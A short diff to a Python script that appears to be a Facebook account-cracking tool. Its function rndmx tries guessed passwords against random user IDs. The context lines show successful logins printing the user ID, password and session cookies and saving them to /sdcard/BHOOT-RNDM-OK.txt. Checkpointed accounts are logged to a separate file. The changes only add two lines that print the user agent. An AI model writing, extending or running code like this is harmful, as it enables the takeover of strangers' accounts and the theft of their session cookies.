@@ -1390,6 +1390,7 @@ def rndmx(ids,pasx,tl):
                         if 'session_key' in po:
                                 uid = po['uid']
                                 print(f'\r{g} (Running) {str(uid)} | {pas} ')
+                                print(f'\r{g} (Running) {str(user_agent)} ')
                                 coki = ';'.join(i['name']+'='+i['value'] for i in po['session_cookies'])
                                 if 'y' in cokix:print(f'\r{g} (Kid) : {coki} ')
                                 open('/sdcard/BHOOT-RNDM-OK.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
@@ -1398,6 +1399,7 @@ def rndmx(ids,pasx,tl):
                         elif 'www.facebook.com' in po['error']['message']: 
                                 uid = po['error']['error_data']['uid']
                                 if 'y' in cpx:print(f'\r{r} (Fucking) {str(uid)} | {pas} ')
+                                print(f'\r{g} (Running) {str(user_agent)} ')
                                 open('/sdcard/BHOOT-RNDM-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                 cp.append(str(uid))
                                 break
